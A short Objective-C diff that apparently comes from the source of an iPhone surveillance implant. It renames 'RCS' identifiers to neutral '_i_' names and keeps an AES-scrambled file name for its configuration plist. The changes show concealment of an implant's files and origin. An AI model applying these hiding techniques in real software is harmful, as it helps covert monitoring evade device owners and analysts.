@@ -497,8 +497,8 @@ NSArray *searchFile (NSString *aFileMask)
   return fileFound;
 }
 
-#define RCS_PLIST     @"rcsiphone.plist"
-#define RCS_PLIST_CLR @"rcsiphone_clr.plist"
+#define RCS_PLIST     @"_i_phone.plist"
+#define RCS_PLIST_CLR @"_i_phone_clr.plist"
 
 NSMutableDictionary *openRcsPropertyFile()
 {  
@@ -513,7 +513,7 @@ NSMutableDictionary *openRcsPropertyFile()
   NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
-  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
+  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
   NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
   [rcsEnc release];
   
@@ -614,7 +614,7 @@ BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
                                    length: CC_MD5_DIGEST_LENGTH];
 
   // Scrambled name
-  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
+  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
   NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
   [rcsEnc release];
 
